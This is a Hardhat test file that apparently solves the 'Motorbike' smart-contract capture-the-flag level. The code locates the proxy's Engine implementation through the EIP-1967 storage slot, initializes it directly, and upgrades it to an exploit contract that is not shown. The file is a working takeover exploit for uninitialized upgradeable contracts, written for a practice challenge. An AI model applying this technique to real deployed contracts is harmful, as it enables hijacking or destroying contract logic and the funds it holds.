import { ethers } from "hardhat";
import { expectLevelSolved } from "../utils";
import { deploymentConfirmation, txConfirmation } from "./utils";

describe("Motorbike Solution", function () {
  it("Should solve the level", expectLevelSolved({
    deployId: "25", 
    solutionFn: async ({ challenge }) => {
      const exploit = await deploymentConfirmation("MotorbikeSolution");
      const implementationSlot = ethers.utils.hexValue(
        ethers.BigNumber.from(ethers.utils.keccak256(ethers.utils.toUtf8Bytes("eip1967.proxy.implementation"))).sub(1));
      const engine = await ethers.getContractAt(
        "Engine", 
        ethers.utils.hexDataSlice(
          await challenge.provider.getStorageAt(challenge.address, implementationSlot),
          12, 32
        ));
      await txConfirmation(engine.initialize());
      await txConfirmation(engine.upgradeToAndCall(exploit.address, "0x00"));
    }
  }));
});
